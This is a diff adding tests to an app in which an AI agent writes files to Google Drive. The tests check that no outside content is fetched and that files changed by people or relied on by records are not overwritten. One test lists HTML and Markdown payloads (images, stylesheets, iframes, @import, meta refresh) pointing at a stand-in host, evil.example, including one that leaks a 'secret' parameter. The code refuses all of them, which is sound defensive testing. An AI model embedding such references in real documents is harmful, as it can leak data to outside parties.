@@ -775,3 +775,81 @@ describe('Google documents and overwriting a file ACB made (google-drive.md "Goo
     }
   })
 })
+
+describe('review fixes (#678): nothing fetched from outside, a file changed in Drive or fixed in a record is never overwritten, old revisions kept', () => {
+  const docBody = (content: Buffer, over: Record<string, unknown> = {}) => ({
+    ...putBody({ name: '外を見ない.md', kind: 'markdown', as: 'google_doc' }, content), ...over,
+  })
+
+  it('a document that would fetch an image, a stylesheet or a frame from outside is refused; inline data and plain links pass', async () => {
+    const token = await tokenFor('m-sato', 'act')
+    const before = google.uploads().length
+    for (const [kind, text] of [
+      ['markdown', '# 報告\n![図](https://evil.example/x.png?d=secret)\n'],
+      ['markdown', '# 報告\n![図][1]\n\n[1]: https://evil.example/x.png\n'],
+      ['markdown', '# 報告\n<img src="//evil.example/x.png">\n'],
+      ['html', '<p>報告</p><img src="https://evil.example/x.png">'],
+      ['html', '<link rel="stylesheet" href="https://evil.example/s.css"><p>報告</p>'],
+      ['html', '<p style="background:url(https://evil.example/b.png)">報告</p>'],
+      ['html', '<style>@import "https://evil.example/s.css";</style><p>報告</p>'],
+      ['html', '<iframe src="https://evil.example/"></iframe>'],
+      ['html', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
+    ] as const) {
+      const content = Buffer.from(text)
+      const r = await ai(token, 'POST', '/put', { ...putBody({ name: `外.${kind === 'html' ? 'html' : 'md'}`, kind, as: 'google_doc' }, content) })
+      expect([r.status, r.body.code], text).toEqual([400, 'DRIVE_EXTERNAL_RESOURCE'])
+    }
+    expect(google.uploads()).toHaveLength(before)
+    const fine = Buffer.from('# 報告\n[資料](https://example.com/page)\n<a href="https://example.com">リンク</a>\n![図](data:image/png;base64,iVBORw0KGgo=)\n')
+    expect((await ai(token, 'POST', '/put', docBody(fine))).body.data.drivePut.state).toBe('done')
+  })
+
+  it('changed in Drive since ACB\'s last put: refused (nothing overwritten); a PDF\'s replaced revision is kept forever first', async () => {
+    const token = await tokenFor('m-sato', 'act')
+    const doc = (await ai(token, 'POST', '/put', docBody(Buffer.from('# 一版\n'), { name: '人が直す.md' }))).body.data.drivePut
+    google.editDriveFile(doc.fileId, '# 人が直した版\n')
+    const r = await ai(token, 'POST', '/put', docBody(Buffer.from('# 二版\n'), { name: '人が直す.md', updateFileId: doc.fileId }))
+    expect([r.status, r.body.code]).toEqual([409, 'DRIVE_FILE_CHANGED_SINCE'])
+    expect(google.driveFile(doc.fileId)!.content.toString()).toBe('# 人が直した版\n')
+    // A PDF: its current head revision is kept forever before the new one replaces it.
+    const pdf = (await ai(token, 'POST', '/put', putBody({ name: '版を残す.pdf' }))).body.data.drivePut
+    const next = Buffer.from('%PDF-1.7\n% 二版\n%%EOF\n')
+    const u = await ai(token, 'POST', '/put', putBody({ name: '版を残す.pdf', updateFileId: pdf.fileId, sha256: sha(next), contentBase64: next.toString('base64') }))
+    expect(u.body.data.drivePut.state, u.text).toBe('done')
+    expect(google.driveFile(pdf.fileId)!.keptRevisions).toEqual([pdf.revisionId])
+    expect(u.body.data.drivePut.revisionId).not.toBe(pdf.revisionId)
+  })
+
+  it('a file a decision or an attachment rests on is never overwritten (Google not asked)', async () => {
+    const token = await tokenFor('m-sato', 'act')
+    const doc = (await ai(token, 'POST', '/put', docBody(Buffer.from('# 根拠\n'), { name: '根拠.md' }))).body.data.drivePut
+    db.prepare(`INSERT INTO record_ledger (company_id, record_id, version, action, actor_id, actor_kind, at, attachments)
+      VALUES (?, 'task-fixedmaterial01', 1, 'decide', 'm-sato', 'human', ?, ?)`)
+      .run(CO, ts(), JSON.stringify([{ link: 'files', kind: 'drive', fileId: doc.fileId, revisionId: doc.revisionId, sha256: 'x' }]))
+    const calls = google.requests.length
+    const r = await ai(token, 'POST', '/put', docBody(Buffer.from('# 直す\n'), { name: '根拠.md', updateFileId: doc.fileId }))
+    expect([r.status, r.body.code]).toEqual([409, 'DRIVE_FILE_FIXED'])
+    expect(google.requests.length).toBe(calls)
+  })
+
+  it('another member\'s link to the same Drive file is never rewritten by this member\'s overwrite', async () => {
+    db.prepare("UPDATE companies SET folder_kind = 'none' WHERE id = ?").run(CO)
+    try {
+      const made = await person('m-tanaka', 'POST', '/records/item', { type: 'task', title: '田中さんのつながり', fields: { assignee: 'm-sato' } })
+      const id = made.body.data.record.id as string
+      const token = await tokenFor('m-sato', 'act')
+      const doc = (await ai(token, 'POST', '/put', docBody(Buffer.from('# 一版\n'), { name: 'ふたりの.md' }))).body.data.drivePut
+      // Tanaka's own link to that file (as if he had picked and linked it), with the facts he read.
+      const meta = JSON.stringify({ revisionId: 'version:1', name: '田中さんが見た名前', sha256: 'tanaka-sha', mimeType: 'application/vnd.google-apps.document', linkedAt: ts() })
+      db.prepare('INSERT INTO record_links (company_id, source_id, name, position, target_id, target_path, created_by, target_meta) VALUES (?, ?, ?, 0, NULL, ?, ?, ?)')
+        .run(CO, id, 'files', `drive:${doc.fileId}`, 'm-tanaka', meta)
+      const r = await ai(token, 'POST', '/put', { ...docBody(Buffer.from('# 二版\n'), { name: 'ふたりの.md', updateFileId: doc.fileId }), recordId: id })
+      expect(r.body.data.drivePut.state, r.text).toBe('done')
+      expect(r.body.data.linkedTo).toBeUndefined()
+      const kept = db.prepare('SELECT created_by, target_meta FROM record_links WHERE company_id = ? AND source_id = ?').all(CO, id) as Json[]
+      expect(kept).toEqual([{ created_by: 'm-tanaka', target_meta: meta }])
+    } finally {
+      db.prepare("UPDATE companies SET folder_kind = 'git' WHERE id = ?").run(CO)
+    }
+  })
+})
